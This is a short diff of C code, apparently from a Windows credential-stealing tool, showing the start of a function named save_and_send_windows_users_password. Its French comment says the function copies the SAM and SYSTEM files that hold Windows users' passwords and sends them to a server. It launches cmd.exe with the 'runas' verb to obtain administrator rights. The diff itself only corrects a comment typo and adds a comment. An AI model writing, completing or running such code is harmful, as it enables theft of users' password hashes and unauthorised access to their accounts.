@@ -8,13 +8,13 @@
 
 int save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info) {
 
-    /*Fonction qui permet de récupérer le fichier ram et system qui contiens les mdp
+    /*Fonction qui permet de récupérer le fichier sam et system qui contiens les mdp
     des utilisateurs windows et de les envoyer au serveur*/
 
     SHELLEXECUTEINFO sei;
     ZeroMemory(&sei, sizeof(sei));
     sei.cbSize = sizeof(sei);
-    sei.lpVerb = "runas";   
+    sei.lpVerb = "runas"; //  runas pour demander les perm admin
     sei.lpFile = "cmd.exe"; 
     char cmd[1024];
     char sam_file_path[128];
